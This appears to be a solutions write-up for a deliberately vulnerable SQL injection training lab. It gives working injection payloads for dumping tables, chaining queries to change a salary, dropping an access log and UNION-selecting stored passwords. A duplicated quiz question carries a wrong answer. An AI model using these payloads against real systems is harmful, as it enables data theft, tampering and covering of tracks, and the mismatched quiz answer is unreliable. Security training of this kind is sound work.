# SQL Injection (intro)

## What is SQL?

_Challenge_: retrieve the `department` of the employee **Bob Franco**.

_Solution_: `SELECT department FROM employees WHERE userid=96134`.

## Data Manipulation Language (DML)

_Challenge_: change the `department` of **Tobi Barnett** to `'Sales'`.

_Solution_: `UPDATE employees SET department='Sales' WHERE userid=89762`.

## Data Definition Language (DDL)

_Challenge_: modify the schema by adding the column `phone` _(varchar(20))_ to the table `employees`.

_Solution_: `ALTER TABLE employees ADD phone varchar(20)`.

## Data Control Language (DCL)

_Challenge_: grant rights to the table `grant_rights` to user `unauthorized_user`.

_Solution_: `GRANT ALL PRIVILEGES ON grant_rights TO unauthorized_user`.

## String SQL injection

_Challenge_: retrieve all the users from the users table using the query `"SELECT * FROM user_data WHERE first_name = 'John' AND last_name = '" + lastName + "'";`.

_Solution_: **SELECT * FROM user_data WHERE first_name='John' AND last_name='** `Smith'` `or` `'1'='1` **'**

## Numeric SQL injection

_Challenge_: retrieve all the data from the users table using the form with query `"SELECT * FROM user_data WHERE login_count = " + Login_Count + " AND userid = "  + User_ID;`.

_Solution_:
- Login_Count: `1`.
- User_Id: `2 OR 1=1;--`.

## Compromising confidentiality with String SQL injection

_Challenge_: retrieve all employee data from the **employees** table using the form with query `"SELECT * FROM employees WHERE last_name = '" + name + "' AND auth_tan = '" + auth_tan + "'";`.

_Solution_:
- Employee Name: `Smith' OR 1=1;--`.
- Authentication TAN: `anything`.

## Compromising Integrity with Query chaining

_Challenge_: change your own salary so you are earning the most. Your name is John **Smith** and your current TAN is **3SL99A**.

_Solution_:
- Employee Name: `'; UPDATE employees SET SALARY=700000 WHERE AUTH_TAN='3SL99A';--`.
- Authentication TAN: `anything`.

## Compromising Availability

_Challenge_: delete the **access_log** table, where all your actions have been logged to.

_Solution_: `'; DROP TABLE access_log; --`.

# SQL Injection (advanced)

## Pulling data from other tables

_Challenge_: retrieve all data from the tables below to find Dave's password.

```
CREATE TABLE user_data (userid int not null,
                        first_name varchar(20),
                        last_name varchar(20),
                        cc_number varchar(30),
                        cc_type varchar(10),
                        cookie varchar(20),
                        login_count int);
                        
CREATE TABLE user_system_data (userid int not null primary key,
			                   user_name varchar(12),
			                   password varchar(10),
			                   cookie varchar(30));
```

_Solution_:
- Name: `' OR 1=1; SELECT * FROM user_system_data;--`.
- Password: `passW0rD`.
- Alternative for Name: `' UNION SELECT userid,user_name, password, 'a', 'b', 'c', 1 from user_system_data --`.

## Assignment

_Challenge_: Can you log in as **Tom**?

_Solution_: 

## Quiz

_What is the difference between a prepared statement and a statement?_
Solution 4: A statement includes actual values, whereas a prepared statement uses placeholders.

_Which one of the following characters is a placeholder for variables?_
Solution 3: ?

_How can prepared statements be faster than statements?_
Solution 2: Prepared statements are compiled once by the database management system and then reused with different inputs, reducing compilation overhead.

_How do prepared statements help prevent SQL injection?_
Solution 2: Prepared statements are compiled once by the database management system and then reused with different inputs, reducing compilation overhead.

_How do prepared statements help prevent SQL injection?_
Solution 3: Placeholders prevent user input from being directly appended to the SQL query, ensuring a clear separation between code and data.

_What happens if a person with malicious intent enters the following input into a registration form that uses a prepared statement? Input: Robert); DROP TABLE Students;--_
Solution 4: The database treats the entire input as a plain string: Robert); DROP TABLE Students;-- without executing it as SQL.